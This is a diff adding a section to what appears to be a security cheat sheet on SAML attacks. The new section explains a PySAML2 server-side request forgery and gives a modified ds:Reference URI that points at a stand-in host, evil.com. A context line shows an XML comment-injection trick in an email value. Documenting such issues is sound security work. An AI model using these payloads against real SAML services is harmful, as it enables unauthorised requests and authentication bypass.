@@ -135,6 +135,24 @@ One of the common issues with protocols relying on `signatures` to prevent tampe
 admin<!--1-->@libcurl.so
 ```
 
+## SAML: PySAML2 SSRF
+
+{% embed url="https://github.com/IdentityPython/pysaml2/issues/510" %}
+
+The SSRF occurs in the `URI` field of the `ds:Reference` node of a SAML response. Normally, these look like this:
+
+```
+<ds:Reference URI="#id117178283225551701714676244">
+```
+
+but you can change them to something like this:
+
+```
+<ds:Reference URI="http://www.evil.com/uhoh?#id117178283225551701714676244">
+```
+
+and the URI will be resolved internally.&#x20;
+
 ### Authentication Bypass
 
 {% embed url="https://0xoverlord.medium.com/authentication-bypass-mis-scoped-saml-sessions-enable-user-impersonation-fd73ce7fbea0" %}
